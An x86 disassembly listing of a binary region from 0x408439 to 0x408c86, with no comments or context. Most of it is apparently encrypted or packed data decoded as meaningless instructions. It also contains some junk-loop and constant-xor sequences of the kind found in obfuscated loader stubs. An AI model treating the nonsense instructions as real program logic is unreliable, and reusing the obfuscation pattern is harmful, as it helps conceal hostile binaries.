  408439:	loope  0x4083d2
  40843b:	cmp    bh,BYTE PTR [ebp+0x1a]
  40843e:	push   eax
  40843f:	retf   0x7440
  408442:	leave  
  408443:	std    
  408444:	stc    
  408445:	inc    edx
  408446:	stos   DWORD PTR es:[edi],eax
  408447:	xchg   esi,eax
  408448:	jno    0x4083cd
  40844a:	mov    ah,0x1
  40844c:	sbb    BYTE PTR [esi-0x428d8f80],ch
  408452:	cmp    eax,0xb875d0b
  408457:	pop    ebx
  408458:	out    dx,al
  408459:	pusha  
  40845a:	es repnz inc edi
  40845d:	hlt    
  40845e:	aam    0xf0
  408460:	and    esi,DWORD PTR [edx]
  408462:	stc    
  408463:	aad    0x83
  408465:	icebp  
  408466:	jmp    0x4e39b9f8
  40846b:	cs inc edx
  40846d:	mov    cl,0xa1
  40846f:	dec    ebx
  408470:	fwait
  408471:	jnp    0x40840d
  408473:	ss fs dec ecx
  408476:	cmp    BYTE PTR [ecx],ch
  408478:	repz dec edx
  40847a:	jecxz  0x408403
  40847c:	or     esi,DWORD PTR ds:0x8f6f95ad
  408482:	repnz mov eax,DWORD PTR [edx]
  408485:	cmp    bh,BYTE PTR [esi]
  408487:	mov    bl,0xd6
  408489:	in     al,dx
  40848a:	or     dh,BYTE PTR ds:0x1e61ba7
  408490:	pop    es
  408491:	fidivr DWORD PTR [esi-0x11]
  408494:	adc    al,BYTE PTR [ebp+0x67]
  408497:	das    
  408498:	mov    eax,ds:0x14864375
  40849d:	mov    ds:0x7e44537a,al
  4084a3:	cwde   
  4084a4:	jb     0x40849c
  4084a6:	lock or DWORD PTR [ecx+0x60],esp
  4084aa:	fist   DWORD PTR [ebp+0x3a]
  4084ad:	dec    ecx
  4084ae:	retf   0xa22
  4084b1:	dec    eax
  4084b2:	xchg   ebx,eax
  4084b3:	add    DWORD PTR [ecx+eax*8],0xffffff88
  4084b7:	pop    esi
  4084b8:	and    al,0x5e
  4084ba:	cmp    eax,0x679026ad
  4084bf:	(bad)  
  4084c1:	fdiv   st(2),st
  4084c3:	dec    esp
  4084c4:	xor    dl,BYTE PTR [ebx-0x42e4f045]
  4084ca:	sbb    BYTE PTR [ebp+0x4a64e989],0xbc
  4084d1:	inc    ecx
  4084d2:	(bad)  
  4084d3:	(bad)  
  4084d4:	into   
  4084d5:	test   edx,eax
  4084d7:	sti    
  4084d8:	lahf   
  4084d9:	mov    WORD PTR [ebx+0x3263eb9b],gs
  4084df:	scas   al,BYTE PTR es:[edi]
  4084e0:	and    BYTE PTR [ebx+0x444b77e2],bl
  4084e6:	ror    DWORD PTR [eax-0x6f],0x80
  4084ea:	mov    dl,0xf8
  4084ec:	and    DWORD PTR [ebp-0x746dc14b],edi
  4084f2:	mov    al,ds:0x94e840f
  4084f7:	add    BYTE PTR [eax],al
  4084f9:	neg    edx
  4084fb:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  408502:	lea    eax,[ebp-0xc]
  408505:	and    DWORD PTR ds:0x43382f,0x0
  40850f:	jmp    0x408521
  408514:	mov    edx,DWORD PTR ds:0x43382f
  40851a:	inc    edx
  40851b:	mov    DWORD PTR ds:0x43382f,edx
  408521:	cmp    DWORD PTR ds:0x43382f,0x13
  408528:	jae    0x40854b
  40852e:	cmp    DWORD PTR ds:0x43382f,0x17
  408535:	jne    0x408546
  40853b:	push   0x433867
  408540:	call   DWORD PTR ds:0x4121cc
  408546:	jmp    0x408514
  40854b:	mov    DWORD PTR [ebp-0x10],eax
  40854e:	and    eax,0x759a
  408553:	mov    eax,DWORD PTR [ebp-0x10]
  408556:	inc    edx
  408557:	mov    edx,DWORD PTR [eax]
  408559:	imul   edx,edx,0xf89ea9ee
  40855f:	mov    DWORD PTR [eax],edx
  408561:	mov    eax,DWORD PTR [ebp-0xc]
  408564:	mov    DWORD PTR ds:0x433717,0x1de7
  40856e:	cmp    eax,0x823721f2
  408573:	je     0x4088e8
  408579:	sub    edi,ebx
  40857b:	mov    eax,DWORD PTR [ebp-0x1c]
  40857e:	sbb    edi,DWORD PTR ds:0x433773
  408584:	or     DWORD PTR [eax],0x60751c9e
  40858a:	and    DWORD PTR ds:0x4337bf,0x0
  408594:	mov    ebx,DWORD PTR ds:0x4337bf
  40859a:	inc    ebx
  40859b:	mov    DWORD PTR ds:0x4337bf,ebx
  4085a1:	cmp    DWORD PTR ds:0x4337bf,0x1f
  4085a8:	jne    0x4085bf
  4085ae:	push   DWORD PTR [ebp-0x1c]
  4085b1:	push   0x4378
  4085b6:	push   DWORD PTR [ebp-0xc]
  4085b9:	call   DWORD PTR ds:0x412010
  4085bf:	cmp    DWORD PTR ds:0x4337bf,0x19
  4085c6:	jb     0x408594
  4085cc:	jmp    0x408753
  4085d1:	xor    BYTE PTR [esi+0x61516153],dh
  4085d7:	xor    BYTE PTR [edi+0x20],dh
  4085da:	outs   dx,BYTE PTR ds:[esi]
  4085db:	fucomi st,st(1)
  4085dd:	dec    eax
  4085de:	int3   
  4085df:	xor    DWORD PTR [esi+0x7e7ed2ec],edx
  4085e5:	in     al,0x7f
  4085e7:	jle    0x408667
  4085e9:	ins    BYTE PTR es:[edi],dx
  4085ea:	retf   0x109b
  4085ed:	enter  0xa09,0xa2
  4085f1:	cmp    BYTE PTR [ebp+0xe1fdc95],0x6e
  4085f8:	pop    es
  4085f9:	aas    
  4085fa:	lds    ecx,FWORD PTR es:[edi]
  4085fd:	ss loop 0x408655
  408600:	test   BYTE PTR [eax],0xeb
  408603:	and    cl,ah
  408605:	add    eax,0x4049cba
  40860a:	xchg   edx,eax
  40860b:	leave  
  40860c:	pop    ebx
  40860d:	imul   ecx,DWORD PTR [eax-0x13],0xffffffb1
  408611:	mov    DWORD PTR [ebx-0x5b],eax
  408614:	dec    eax
  408615:	mov    al,BYTE PTR [edx+0x5d]
  408618:	dec    ebp
  408619:	mov    dh,0xe0
  40861b:	pop    eax
  40861c:	pop    esi
  40861d:	pushf  
  40861e:	push   ds
  40861f:	xchg   edx,eax
  408620:	dec    esi
  408621:	addr16 and eax,0xcef86820
  408627:	sbb    al,0xbf
  408629:	inc    ebp
  40862a:	inc    edi
  40862b:	gs push edi
  40862d:	repz sub bl,bl
  408630:	test   BYTE PTR [edi+0x219a281d],al
  408636:	ds das 
  408638:	jp     0x4085bc
  40863a:	sbb    esp,DWORD PTR [ecx+0xce8a9d0]
  408640:	inc    esi
  408641:	in     eax,0xdd
  408643:	fld    QWORD PTR [edi-0x7585fbb5]
  408649:	jecxz  0x40860e
  40864b:	inc    ecx
  40864c:	mov    eax,ds:0x283ec8f6
  408651:	and    al,0x5
  408653:	xor    DWORD PTR [edi-0x5e],esp
  408656:	mov    eax,ds:0xe43b44f0
  40865b:	ror    BYTE PTR [edx+0x3f02c68d],1
  408661:	shl    esp,cl
  408663:	les    edx,FWORD PTR [ebp+0x51788b2b]
  408669:	fidiv  WORD PTR [ecx]
  40866b:	mov    ecx,0x25e47e41
  408670:	icebp  
  408671:	xchg   ebx,eax
  408672:	mov    dl,0xc9
  408674:	sbb    BYTE PTR [esi-0x28fedbaa],0x0
  40867b:	mov    cl,0x8f
  40867d:	jno    0x40864b
  40867f:	push   esp
  408680:	addr16 out 0xb8,al
  408683:	push   0x3f
  408685:	jmp    0x40860a
  408687:	je     0x40865e
  408689:	sahf   
  40868a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40868b:	ins    DWORD PTR es:[edi],dx
  40868c:	push   0x3dddf7ec
  408691:	push   edx
  408692:	stos   DWORD PTR es:[edi],eax
  408693:	out    dx,al
  408694:	sti    
  408695:	sub    al,0xd9
  408697:	mov    al,0x45
  408699:	(bad)  
  40869a:	adc    esi,DWORD PTR [edi+0xf]
  40869d:	adc    DWORD PTR [eax+eiz*8+0x2cc144c4],0xffffffa4
  4086a5:	adc    BYTE PTR [ecx+0x6da96899],dl
  4086ab:	mov    edi,0x92a9638c
  4086b0:	pop    esp
  4086b1:	dec    edi
  4086b2:	push   eax
  4086b3:	xchg   ecx,eax
  4086b4:	sub    bl,bl
  4086b6:	adc    eax,0xdc52a55
  4086bb:	sbb    dh,BYTE PTR [esi+0x70]
  4086be:	mov    esp,0x69fa8d3c
  4086c3:	call   0x417e:0xa03160a6
  4086ca:	(bad)  
  4086cc:	popf   
  4086cd:	out    dx,al
  4086ce:	sub    DWORD PTR [edi+0x37],edx
  4086d1:	push   0x4e2cc6f5
  4086d6:	inc    esp
  4086d7:	add    bh,dh
  4086d9:	inc    esp
  4086da:	pop    ecx
  4086db:	daa    
  4086dc:	sahf   
  4086dd:	xor    ecx,DWORD PTR [esp+eiz*2]
  4086e0:	pop    eax
  4086e1:	ror    DWORD PTR [ebp+0x25cc3a74],cl
  4086e7:	inc    ebp
  4086e8:	or     bx,WORD PTR [ebp-0x55a1b57f]
  4086ef:	js     0x4086a2
  4086f1:	ss pop ebx
  4086f3:	adc    eax,0x3ae904c0
  4086f8:	jo     0x408704
  4086fa:	enter  0x4b1a,0x14
  4086fe:	pop    ds
  4086ff:	enter  0x5ca2,0xac
  408703:	stc    
  408704:	fldenv [edi]
  408706:	or     esi,DWORD PTR [ebx-0xd]
  408709:	mov    esi,0xac1a62b4
  40870e:	push   0x3c
  408710:	imul   esp,DWORD PTR [ebp+0x3a2b7da8],0x8ccb25a
  40871a:	or     al,0x88
  40871c:	repnz aas 
  40871e:	shr    DWORD PTR [ebx],cl
  408720:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408722:	call   0x2cff9ec5
  408727:	test   dl,ah
  408729:	cmp    DWORD PTR [edx-0x7],esp
  40872c:	outs   dx,DWORD PTR ds:[esi]
  40872d:	or     DWORD PTR [edx+ecx*2],ebp
  408730:	mov    edx,0x8c7b501
  408735:	jle    0x408767
  408737:	sub    dh,ah
  408739:	lods   al,BYTE PTR ds:[esi]
  40873a:	scas   eax,DWORD PTR es:[edi]
  40873b:	ret    0x19b9
  40873e:	adc    DWORD PTR ds:0x48395ced,0x20
  408745:	or     WORD PTR [si-0x77],sp
  40874a:	imul   eax,DWORD PTR [esi+0x55],0x6cbf8a84
  408751:	bound  ebx,QWORD PTR [ebx+ecx*4-0x3ecc07bb]
  408758:	add    eax,esi
  40875a:	jmp    0x4088e1
  40875f:	(bad)  
  408761:	adc    DWORD PTR [ebp+0x71684531],eax
  408767:	test   BYTE PTR [esi+0x41],cl
  40876a:	or     BYTE PTR [ecx+0x5261ae55],cl
  408770:	sar    DWORD PTR [esi+0x7e],cl
  408773:	in     al,0x7f
  408775:	jle    0x4087f5
  408777:	out    dx,al
  408778:	mov    dh,0x61
  40877a:	call   0x96a3:0x89d665a6
  408781:	bound  eax,QWORD PTR [edi]
  408783:	(bad)  
  408784:	out    dx,eax
  408785:	nop
  408786:	pop    ds
  408787:	push   es
  408788:	mov    cl,0xbd
  40878a:	fs lock sbb eax,0xff3ff2c9
  408791:	ja     0x4087d1
  408793:	xchg   esp,eax
  408794:	fisttp DWORD PTR [edi+0x121bc972]
  40879a:	gs add esi,edi
  40879d:	jmp    0x4087c1
  40879f:	jb     0x4087c9
  4087a1:	xor    BYTE PTR [ecx+0x76],0xeb
  4087a5:	pop    ecx
  4087a6:	pop    edi
  4087a7:	cwde   
  4087a8:	mov    ss,WORD PTR [edi-0x45f50cd9]
  4087ae:	mov    edi,0x2ab2110f
  4087b3:	sub    eax,0x63792e82
  4087b8:	lds    esi,FWORD PTR [ecx+ebp*8+0x18650fbd]
  4087bf:	pushf  
  4087c0:	xor    esp,DWORD PTR [ecx+eax*4]
  4087c3:	inc    esi
  4087c4:	pop    ss
  4087c5:	(bad)  
  4087c7:	fsubr  st,st(3)
  4087c9:	jno    0x40881a
  4087cb:	fistp  WORD PTR [ebx+0x7b0a6b17]
  4087d1:	loopne 0x408835
  4087d3:	and    esi,esp
  4087d5:	inc    ebp
  4087d6:	jmp    0x82bf:0xf4edbe5d
  4087dd:	lods   eax,DWORD PTR ds:[esi]
  4087de:	call   0x1ab8fd20
  4087e3:	gs cmc 
  4087e5:	fiadd  WORD PTR [edi]
  4087e7:	stos   BYTE PTR es:[edi],al
  4087e8:	or     ebp,edx
  4087ea:	test   BYTE PTR [esi-0x75bc026e],bl
  4087f0:	shl    BYTE PTR [edi+0x3790cea7],1
  4087f6:	add    dh,0x2e
  4087f9:	fsubr  st,st(3)
  4087fb:	imul   esp,DWORD PTR [ebx+0x2bc74e7a],0x23
  408802:	outs   dx,BYTE PTR ds:[esi]
  408803:	test   eax,eax
  408805:	loope  0x408851
  408807:	scas   eax,DWORD PTR es:[edi]
  408808:	inc    edx
  408809:	mov    ebp,ecx
  40880b:	(bad)  
  40880c:	iret   
  40880d:	xchg   ecx,eax
  40880e:	mov    edi,0xc3b6a33a
  408813:	or     BYTE PTR [ebx+0x27],dl
  408816:	jge    0x408823
  408818:	out    0x71,eax
  40881a:	xor    BYTE PTR fs:[ecx],bh
  40881d:	sbb    al,0x36
  40881f:	inc    ebp
  408820:	and    DWORD PTR [eax*4-0x6b89341f],0xfffffff6
  408828:	test   eax,0x1314845f
  40882d:	sar    BYTE PTR [edx+0x14],cl
  408830:	scas   eax,DWORD PTR es:[edi]
  408831:	aam    0x4b
  408833:	into   
  408834:	dec    edi
  408835:	pop    ebp
  408836:	adc    BYTE PTR [edi-0x10],0xe7
  40883a:	jnp    0x40881a
  40883c:	mov    esi,0x55fb175
  408841:	jge    0x4087dc
  408843:	fistp  WORD PTR [eax+0x64]
  408846:	out    dx,al
  408847:	mov    esi,0xdccfb46c
  40884c:	jbe    0x40888c
  40884e:	dec    ebp
  40884f:	dec    esi
  408850:	mov    edi,0xea4c0093
  408855:	inc    ebx
  408856:	cmp    eax,0x92868f2e
  40885b:	(bad)  
  40885c:	pop    ebx
  40885d:	popa   
  40885e:	xchg   edi,eax
  40885f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408860:	cmp    al,0x37
  408862:	xor    BYTE PTR [ebp-0x46c77c20],ah
  408868:	outs   dx,BYTE PTR ds:[esi]
  408869:	cli    
  40886a:	aam    0xb1
  40886c:	pop    esp
  40886d:	pop    es
  40886e:	test   eax,0x5fb264c0
  408873:	ins    BYTE PTR es:[edi],dx
  408874:	out    0xca,al
  408876:	lods   al,BYTE PTR ds:[esi]
  408877:	mov    ebx,0x33f8baa6
  40887c:	mov    bh,0xa3
  40887e:	pushf  
  40887f:	retf   0x438e
  408882:	dec    esi
  408883:	sbb    BYTE PTR [ecx+0x15],cl
  408886:	mov    eax,0xd413f75f
  40888b:	cmp    eax,0xef905919
  408890:	sub    BYTE PTR [ebp-0x24],dh
  408893:	sub    ch,0x1
  408896:	or     al,0x43
  408898:	dec    edi
  408899:	mov    eax,ds:0x74612253
  40889e:	popf   
  40889f:	add    al,dh
  4088a1:	xor    dh,BYTE PTR [ebp+0x155cfcc3]
  4088a7:	xor    al,cl
  4088a9:	bound  ebp,QWORD PTR gs:[edx-0x3c]
  4088ad:	push   0x4c3084b9
  4088b2:	cmp    BYTE PTR [esi-0x5f102fd8],0x10
  4088b9:	jl     0x4088cc
  4088bb:	gs add al,0x76
  4088be:	jp     0x40892c
  4088c0:	dec    esp
  4088c1:	inc    edi
  4088c2:	mov    esp,DWORD PTR ds:0x1a82d02a
  4088c8:	sub    dh,ah
  4088ca:	adc    DWORD PTR [esi-0x35],edx
  4088cd:	or     ebx,esi
  4088cf:	ror    BYTE PTR [edi+0x1a33522f],cl
  4088d5:	outs   dx,BYTE PTR ds:[esi]
  4088d6:	xchg   DWORD PTR [esi+ebp*1],ebp
  4088d9:	int    0x23
  4088db:	lahf   
  4088dc:	push   edx
  4088dd:	enter  0xf35a,0xf
  4088e1:	pop    edi
  4088e2:	pop    esi
  4088e3:	pop    ebx
  4088e4:	leave  
  4088e5:	ret    0x4
  4088e8:	mov    eax,DWORD PTR [ebp-0xc]
  4088eb:	add    eax,DWORD PTR [ebp-0x18]
  4088ee:	cmp    eax,0x7ad64f9b
  4088f3:	je     0x408907
  4088f9:	mov    eax,DWORD PTR [ebp-0x10]
  4088fc:	and    DWORD PTR [eax],0x751c99
  408902:	jmp    0x40858a
  408907:	mov    eax,DWORD PTR [ebp-0xc]
  40890a:	mov    edx,DWORD PTR [ebp-0x18]
  40890d:	or     eax,edx
  40890f:	cmp    eax,0xfabf2dfb
  408914:	je     0x408928
  40891a:	mov    eax,DWORD PTR [ebp-0x10]
  40891d:	xor    DWORD PTR [eax],0x2650fa8f
  408923:	jmp    0x40858a
  408928:	mov    ax,WORD PTR [ebp-0x4]
  40892c:	jmp    0x408ab3
  408931:	test   eax,0x53c2d3f0
  408936:	loope  0x4088e1
  408938:	jno    0x40892b
  40893a:	jmp    0x4f7d681a
  40893f:	jmp    0x408930
  408941:	cmp    cl,dl
  408943:	jle    0x4089c3
  408945:	in     al,0x7f
  408947:	jle    0x4089c7
  408949:	rcr    DWORD PTR [esi+0x37],1
  40894c:	inc    eax
  40894d:	pop    ebx
  40894e:	jne    0x4089cb
  408950:	jmp    0xdd8707a3
  408955:	mov    bh,BYTE PTR [eax-0x27e33269]
  40895b:	test   al,0x4
  40895d:	gs fs add al,0x6e
  408961:	je     0x4089b1
  408963:	pop    esp
  408964:	jae    0x4088ef
  408966:	lods   al,BYTE PTR ds:[esi]
  408967:	pop    edx
  408968:	dec    edx
  408969:	sub    dh,bh
  40896b:	and    ch,BYTE PTR [edx-0x7233be4b]
  408971:	addr16 mov eax,ds:0x9248
  408975:	adc    bl,cl
  408977:	(bad)  
  408978:	out    dx,eax
  408979:	dec    ebp
  40897a:	test   DWORD PTR [edi],0x8ab6810b
  408980:	ja     0x408996
  408982:	mov    eax,0xc2085503
  408987:	sbb    bl,cl
  408989:	xchg   ecx,eax
  40898a:	jge    0x4089a9
  40898c:	js     0x4089f4
  40898e:	push   edi
  40898f:	xchg   esp,eax
  408990:	adc    eax,0x92e8ff31
  408995:	pusha  
  408996:	stos   DWORD PTR es:[edi],eax
  408997:	es adc al,0x9
  40899a:	xlat   BYTE PTR ds:[ebx]
  40899b:	adc    DWORD PTR [ebp-0x49636ebf],ebx
  4089a1:	pop    edx
  4089a2:	fcomp  st(0)
  4089a4:	or     edi,DWORD PTR [esi+ecx*2+0x7e97195a]
  4089ab:	inc    esi
  4089ac:	mov    ebp,0x2c9afc27
  4089b1:	adc    al,0x88
  4089b3:	adc    eax,0x5d7df13a
  4089b8:	push   ecx
  4089b9:	cwde   
  4089ba:	push   cs
  4089bb:	mov    ah,0x41
  4089bd:	call   0x4bb2:0x3ea151b0
  4089c4:	dec    ecx
  4089c5:	in     al,0xb6
  4089c7:	pop    edx
  4089c8:	xchg   ecx,eax
  4089c9:	cmp    DWORD PTR [bp+si],ebp
  4089cc:	sahf   
  4089cd:	jmp    0xf311a4b3
  4089d2:	jmp    0x26d53353
  4089d7:	adc    eax,0x6ac3450e
  4089dc:	rcl    DWORD PTR [esi-0x793df003],0x7c
  4089e3:	mov    dl,0x48
  4089e5:	loopne 0x408a03
  4089e7:	pop    edx
  4089e8:	cmp    DWORD PTR [edx-0x286414c],edx
  4089ee:	test   al,0x41
  4089f0:	rol    BYTE PTR [ebx],1
  4089f2:	add    bl,bh
  4089f4:	jns    0x408a4f
  4089f6:	aam    0x2a
  4089f8:	jb     0x4089ce
  4089fa:	and    eax,0xbd5d2ced
  4089ff:	out    0x9f,eax
  408a01:	cmp    DWORD PTR [edx],edi
  408a03:	inc    eax
  408a04:	xchg   esp,eax
  408a05:	in     eax,0x4c
  408a07:	sub    BYTE PTR [edi+0x2735976],bl
  408a0d:	xor    DWORD PTR [edi+esi*1],ebx
  408a10:	pop    eax
  408a11:	push   0xffffffc4
  408a13:	xchg   ecx,eax
  408a14:	in     eax,dx
  408a15:	xchg   DWORD PTR [ebx-0x16],esp
  408a18:	out    0x30,al
  408a1a:	mov    ah,0x50
  408a1c:	mov    eax,ds:0x5c4e7bd9
  408a21:	out    0xae,al
  408a23:	xlat   BYTE PTR ds:[ebx]
  408a24:	(bad)  
  408a25:	and    al,0x4
  408a27:	sahf   
  408a28:	scas   eax,DWORD PTR es:[edi]
  408a29:	inc    ebp
  408a2a:	and    esp,DWORD PTR ds:0x27fd7da7
  408a30:	neg    bh
  408a32:	int3   
  408a33:	bnd jmp 0x408a14
  408a36:	cmp    DWORD PTR [edx+ebx*1+0x6e111c60],esi
  408a3d:	fisub  WORD PTR [esi-0x72]
  408a40:	inc    ecx
  408a41:	sub    DWORD PTR [edx+0x1b],edx
  408a44:	(bad)  
  408a47:	xchg   ecx,eax
  408a48:	add    al,0x8
  408a4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a4b:	inc    ecx
  408a4c:	rcr    BYTE PTR [ecx+ecx*8],0xd6
  408a50:	stc    
  408a51:	daa    
  408a52:	repz cld 
  408a54:	js     0x408a5f
  408a56:	xchg   ebx,eax
  408a57:	xor    eax,0x45d0a392
  408a5c:	aas    
  408a5d:	lods   al,BYTE PTR ds:[esi]
  408a5e:	cmp    esp,0x9aba6298
  408a64:	in     eax,dx
  408a65:	out    dx,eax
  408a66:	sub    dh,bl
  408a68:	repnz push esi
  408a6a:	call   0xf035:0x3559f48b
  408a71:	daa    
  408a72:	cwde   
  408a73:	arpl   WORD PTR [ebp-0x526139df],bp
  408a79:	icebp  
  408a7a:	cmp    eax,0xb95cae6
  408a7f:	sbb    DWORD PTR [eax-0x69],ecx
  408a82:	cdq    
  408a83:	or     edx,DWORD PTR [edx]
  408a85:	adc    al,0x7b
  408a87:	jp     0x408ac4
  408a89:	inc    edi
  408a8a:	jbe    0x408a3e
  408a8c:	xor    DWORD PTR [eax-0x14],ebx
  408a8f:	cmp    ecx,ebx
  408a91:	adc    ecx,esp
  408a93:	dec    esp
  408a94:	cmp    DWORD PTR [ebx+0x72],edx
  408a97:	lods   eax,DWORD PTR fs:[esi]
  408a99:	shr    ebp,cl
  408a9b:	inc    ebx
  408a9c:	ins    BYTE PTR es:[edi],dx
  408a9d:	aam    0x86
  408a9f:	xchg   ecx,eax
  408aa0:	cli    
  408aa1:	ins    DWORD PTR es:[edi],dx
  408aa2:	adc    DWORD PTR [eax+edi*1+0x54],esp
  408aa6:	adc    DWORD PTR [edx+0x16f92aaf],eax
  408aac:	jl     0x408b0d
  408aae:	daa    
  408aaf:	out    0x87,al
  408ab1:	stos   DWORD PTR es:[edi],eax
  408ab2:	stos   DWORD PTR es:[edi],eax
  408ab3:	mov    edi,DWORD PTR [ebp+0x8]
  408ab6:	mov    edi,DWORD PTR [edi]
  408ab8:	mov    edx,0x8a3c
  408abd:	xor    ax,dx
  408ac0:	mov    edx,0x3b02
  408ac5:	add    ax,dx
  408ac8:	cmp    ax,WORD PTR [edi]
  408acb:	je     0x408c9f
  408ad1:	mov    eax,DWORD PTR [ebp-0x14]
  408ad4:	xor    eax,ecx
  408ad6:	add    eax,esi
  408ad8:	mov    DWORD PTR [ebp-0x24],eax
  408adb:	mov    eax,DWORD PTR [ebp-0x28]
  408ade:	mov    di,WORD PTR [ebp-0x2c]
  408ae2:	mov    ebx,0x8a3c
  408ae7:	xor    di,bx
  408aea:	add    di,dx
  408aed:	movzx  edx,di
  408af0:	mov    edi,DWORD PTR [ebp-0x8]
  408af3:	xor    edi,ecx
  408af5:	lea    edx,[edx+edi*1+0x32729b]
  408afc:	add    DWORD PTR [eax],edx
  408afe:	mov    eax,DWORD PTR [ebp-0x20]
  408b01:	mov    edx,DWORD PTR [ebp-0x8]
  408b04:	mov    edi,DWORD PTR [ebp-0x24]
  408b07:	xor    edx,ecx
  408b09:	jmp    0x408c90
  408b0e:	push   esi
  408b0f:	adc    BYTE PTR [ebx+0x50555155],0x81
  408b16:	sub    esi,edi
  408b18:	jmp    0x408b0d
  408b1a:	xchg   ecx,eax
  408b1b:	retf   0x6e0c
  408b1e:	scas   al,BYTE PTR es:[edi]
  408b1f:	fidivr WORD PTR [esi+0x7e]
  408b22:	in     al,0x7f
  408b24:	jle    0x408ba4
  408b26:	mov    WORD PTR [eax+0x11],ds
  408b29:	pop    ebx
  408b2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b2b:	mov    ds:0x54e0e66f,eax
  408b30:	push   ds
  408b31:	sbb    DWORD PTR [eax],eax
  408b33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b34:	mov    cl,0x5e
  408b36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b37:	push   es
  408b38:	fs mov ecx,0x41ae1657
  408b3e:	jge    0x408b2a
  408b40:	adc    al,0xef
  408b42:	imul   eax,DWORD PTR [esi],0xffffffe8
  408b45:	(bad)  
  408b46:	test   ebx,0x894dd056
  408b4c:	test   DWORD PTR ss:[edx-0x2095f4cd],edi
  408b53:	sub    BYTE PTR [ebp-0x22],bh
  408b56:	jg     0x408b37
  408b58:	js     0x408bd5
  408b5a:	not    BYTE PTR [ecx+0x6eb363ec]
  408b60:	rcl    DWORD PTR [ebx-0x33d446b8],0xe1
  408b67:	(bad)
  408b6a:	ror    BYTE PTR [edi+0x32],cl
  408b6d:	add    DWORD PTR [ecx+eax*8+0x7e42cff4],ebx
  408b74:	sbb    DWORD PTR [ebp-0x1d],ebx
  408b77:	in     al,dx
  408b78:	dec    BYTE PTR [ebx]
  408b7a:	xor    eax,0x45af0eea
  408b7f:	scas   eax,DWORD PTR es:[edi]
  408b80:	or     al,0x80
  408b82:	push   ecx
  408b83:	dec    ebp
  408b84:	sub    ebx,esi
  408b86:	jae    0x408bfd
  408b88:	dec    eax
  408b89:	pop    esi
  408b8a:	lods   al,BYTE PTR ds:[esi]
  408b8b:	pop    ebx
  408b8c:	mov    ch,0x7b
  408b8e:	outs   dx,DWORD PTR ds:[esi]
  408b8f:	test   DWORD PTR [ebx+ecx*1],ecx
  408b92:	cld    
  408b93:	fbld   TBYTE PTR [eax]
  408b95:	jmp    0x408b96
  408b97:	and    DWORD PTR [edi+edi*8],eax
  408b9a:	shl    dl,0x4d
  408b9d:	or     esi,DWORD PTR [eax+0x4e]
  408ba0:	jmp    0x24760201
  408ba5:	inc    eax
  408ba6:	pop    ecx
  408ba7:	jne    0x408c08
  408ba9:	mov    bl,0x78
  408bab:	pop    ebx
  408bac:	cli    
  408bad:	mov    bh,0x52
  408baf:	sbb    eax,0x9e9316a0
  408bb4:	cmp    BYTE PTR [edx+0x33dfca2e],bl
  408bba:	(bad)  
  408bbb:	push   edx
  408bbc:	mov    al,0x5f
  408bbe:	adc    BYTE PTR [esi-0x40],dh
  408bc1:	xchg   edx,eax
  408bc2:	sbb    edx,DWORD PTR [edx]
  408bc4:	push   esp
  408bc5:	xchg   esi,eax
  408bc6:	fld    TBYTE PTR [eax]
  408bc8:	pop    ss
  408bc9:	test   eax,0xe4ab4037
  408bce:	dec    ecx
  408bcf:	jbe    0x408c25
  408bd1:	push   esi
  408bd2:	lds    esi,FWORD PTR [edi+0x1eade21]
  408bd8:	daa    
  408bd9:	into   
  408bda:	daa    
  408bdb:	adc    al,0xe9
  408bdd:	pop    ebp
  408bde:	nop
  408bdf:	scas   eax,DWORD PTR es:[edi]
  408be0:	mov    ebp,0x9e9594f0
  408be5:	jmp    0xdcfa4274
  408bea:	leave  
  408beb:	mov    ds:0x7e62e19d,al
  408bf0:	dec    ebx
  408bf1:	jmp    0xbef974ec
  408bf6:	loope  0x408bbf
  408bf8:	push   ds
  408bf9:	sbb    eax,DWORD PTR [ecx]
  408bfb:	loope  0x408bfc
  408bfd:	mov    dl,0x55
  408bff:	mov    bl,0x8f
  408c01:	in     eax,0x53
  408c03:	cmp    ecx,esi
  408c05:	pop    edx
  408c06:	cmp    al,0x8b
  408c08:	xlat   BYTE PTR ds:[ebx]
  408c09:	mov    bh,0x70
  408c0b:	outs   dx,BYTE PTR ds:[esi]
  408c0c:	int    0x6c
  408c0e:	out    0xa7,al
  408c10:	mov    WORD PTR [eax+0x31ff40c3],?
  408c16:	cwde   
  408c17:	cmc    
  408c18:	fmul   DWORD PTR [ecx]
  408c1a:	jmp    0xb84b051f
  408c1f:	adc    al,0x29
  408c21:	sbb    DWORD PTR [ebx-0x74],0xccc9f38c
  408c28:	loope  0x408bef
  408c2a:	scas   al,BYTE PTR es:[edi]
  408c2b:	pop    ecx
  408c2c:	test   cl,bl
  408c2e:	mov    al,BYTE PTR [eax]
  408c30:	cwde   
  408c31:	lods   eax,DWORD PTR ds:[esi]
  408c32:	ret    0x3b31
  408c35:	or     esi,DWORD PTR [edx+0x5e]
  408c38:	inc    ecx
  408c39:	xor    ebp,DWORD PTR [edi]
  408c3b:	jne    0x408bd2
  408c3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c3e:	test   BYTE PTR [eax],ah
  408c40:	aad    0x12
  408c42:	cmp    eax,0xd958215d
  408c47:	ds stos BYTE PTR es:[edi],al
  408c49:	fidiv  WORD PTR [edx+0x3e0bfde3]
  408c4f:	in     al,0xbb
  408c51:	(bad)  
  408c52:	ja     0x408ccf
  408c54:	ror    BYTE PTR [ebx+0x3d],1
  408c57:	xchg   BYTE PTR [ebx+0x33],bh
  408c5a:	xor    al,0x9e
  408c5c:	mov    ebx,0xaca0c82d
  408c61:	and    ecx,edx
  408c63:	cs std 
  408c65:	je     0x408ca8
  408c67:	pop    esp
  408c68:	mov    bl,0xd5
  408c6a:	int    0x3d
  408c6c:	loopne 0x408ca3
  408c6e:	add    DWORD PTR [esi],ebx
  408c70:	and    BYTE PTR [esi+ebx*4-0x18fef916],dh
  408c77:	jae    0x408c33
  408c79:	jb     0x408cab
  408c7b:	push   ebp
  408c7c:	cdq    
  408c7d:	cli    
  408c7e:	call   DWORD PTR [edx*2+0x21adaaee]
  408c85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408c86:	pop    ecx
